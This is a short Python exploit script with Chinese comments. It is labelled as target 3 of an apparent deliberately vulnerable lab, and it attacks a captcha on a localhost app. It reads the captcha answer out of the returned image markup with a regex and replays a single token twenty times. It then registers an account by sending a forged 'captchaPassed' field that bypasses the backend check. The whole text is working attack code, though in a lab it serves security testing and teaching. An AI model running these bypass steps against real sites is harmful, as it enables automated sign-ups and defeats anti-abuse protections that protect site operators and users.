"""靶点 3：验证码绕过。仅 vulnerable profile 下下发。"""
import httpx, re

base = "http://localhost:8080"

with httpx.Client(base_url=base) as c:
    r = c.get("/captcha/issue")
    j = r.json()
    token = j["token"]
    m = re.search(r">(\d{4})<", j["image"])
    answer = m.group(1) if m else ""
    print(f"\u62ff\u5230\u9a8c\u8bc1\u7801 token={token} answer={answer}")

    # 复用 20 次
    for i in range(20):
        v = c.post("/captcha/verify",
                   json={"token": token, "answer": answer})
        print(f"\u7b2c {i+1} \u6b21\u590d\u7528\uff1a{v.json()}")

    # 伪造前端字段绕过后端
    r = c.post("/auth/register",
        json={"username": "bypass_user", "password": "P@ssw0rd!",
              "captchaPassed": True})
    print("\u7ed5\u8fc7\u6ce8\u518c\uff1a", r.status_code, r.text)
